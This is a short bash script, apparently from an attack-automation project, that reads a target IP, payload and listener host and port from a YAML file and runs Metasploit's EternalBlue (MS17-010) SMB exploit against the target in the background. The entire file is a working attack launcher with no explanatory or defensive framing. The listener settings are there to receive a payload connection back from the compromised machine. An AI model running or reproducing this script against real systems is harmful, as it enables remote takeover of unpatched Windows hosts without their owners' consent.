#!/bin/bash
# scripts/exploits.sh

CONFIG_FILE="/etc/attack-config.yml"

# Extract variables using yq
TARGET_IP=$(yq e '.exploits.target_ip' "$CONFIG_FILE")
PAYLOAD=$(yq e '.exploits.payload' "$CONFIG_FILE")
LHOST=$(yq e '.exploits.lhost' "$CONFIG_FILE")
LPORT=$(yq e '.exploits.lport' "$CONFIG_FILE")

echo "Starting Exploits Attack: Exploiting vulnerability on $TARGET_IP with payload $PAYLOAD..."

# Execute exploit using Metasploit
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST $TARGET_IP; set PAYLOAD $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; run" &

echo "Exploits Attack Initiated."
